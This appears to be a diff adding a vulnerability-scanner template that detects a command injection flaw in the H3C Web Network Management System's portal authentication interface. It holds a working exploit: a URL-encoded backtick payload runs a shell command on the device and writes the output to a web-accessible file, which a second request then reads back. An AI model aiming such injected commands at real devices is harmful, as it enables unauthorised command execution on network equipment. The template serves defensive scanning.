@@ -1,0 +1,46 @@
+id: h3c-aaa-portal-auth-command-exec
+
+info:
+  name: H3C Web Network Management System Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The H3C Web Network Management System has a command injection vulnerability in the `aaa_portal_auth_local_submit` interface. Attackers can exploit this to execute system commands and gain system privileges.
+  classification:
+    cvss-score: 9.8
+  tags: command-exec
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-command-injection
+    method: GET
+    path:
+      - "/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix=%60%6c%73%20%3e%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%74%65%73%74%31%31%2e%74%78%74%60"
+    headers:
+      Host: "127.0.0.1"
+      Referer: "127.0.0.1"
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "logout.php"
+
+  - id: verify-command-exec
+    method: GET
+    path:
+      - "/webui/images/basic/login/test11.txt"
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "attachements"
+          - "configDefault.inc"
